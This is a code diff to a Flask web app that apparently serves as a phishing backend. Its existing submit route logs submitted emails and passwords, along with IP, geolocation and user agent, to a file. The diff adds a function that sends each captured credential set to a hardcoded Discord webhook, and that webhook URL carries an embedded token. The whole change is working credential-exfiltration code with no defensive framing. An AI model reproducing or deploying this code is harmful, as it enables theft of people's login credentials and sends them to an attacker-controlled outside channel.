@@ -2,6 +2,25 @@ from flask import Flask, render_template, request
 import datetime
 import requests
 
+def send_to_discord(email, password, ip, location_str, user_agent):
+    webhook_url = "https://discord.com/api/webhooks/1392463520653905971/H6CdWhULMiWyN5746DAW89sJhwV0GrxoOlEy6nvywXp8J_M4is4Ucmbv2xJMFXn5MtTH"
+
+    timestamp = datetime.datetime.now()
+    log_message = (
+        f"[LOG] {timestamp} | {email} | {password} | IP: {ip} | "
+        f"Location: {location_str} | UA: {user_agent}\n"
+    )
+
+    data = {
+        "content": log_message
+    }
+
+    try:
+        requests.post(webhook_url, json=data)
+    except Exception as e:
+        print(f"[ERROR] Failed to send log to Discord: {e}")
+
+
 def get_location(ip):
     url = f"http://ip-api.com/json/{ip}"
     response = requests.get(url)
@@ -45,6 +64,7 @@ def submit():
     with open("creds.txt", "a") as f:
         f.write(f"{datetime.datetime.now()} | {email} | {password} | IP: {ip} | Location: {location_str} | UA: {user_agent}\n")
     print(f"[LOG] {datetime.datetime.now()} | {email} | {password} | IP: {ip} | Location: {location_str} | UA: {user_agent}\n")
+    send_to_discord(email, password, ip, location_str, user_agent)
     return render_template('submit.html', email=email)
 
 if __name__ == '__main__':
